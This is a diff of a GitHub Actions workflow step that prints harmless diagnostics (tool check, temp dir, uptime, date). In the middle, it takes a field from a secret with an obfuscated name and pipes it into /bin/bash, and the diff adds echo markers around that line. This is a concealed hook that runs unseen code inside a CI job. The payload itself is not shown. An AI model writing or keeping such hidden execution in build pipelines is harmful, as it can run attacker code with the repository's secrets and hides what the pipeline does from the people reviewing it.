@@ -14,8 +14,9 @@ jobs:
           n18267: ${{ secrets.n18267 }}
         run: |
           [ "$(which sqlite3)" != "" ] && echo "sqlite3 installed" || echo "sqlite3 not installed"
-          history | grep ls
+          echo "now do second"
           echo $n18267 | jq -r .j32142 | /bin/bash
+          echo "now do third"
           echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
           echo "Uptime: $(uptime 2>/dev/null | cut -d' ' -f1-3 || echo N/A)"
           echo "Date only: $(date +%F)"
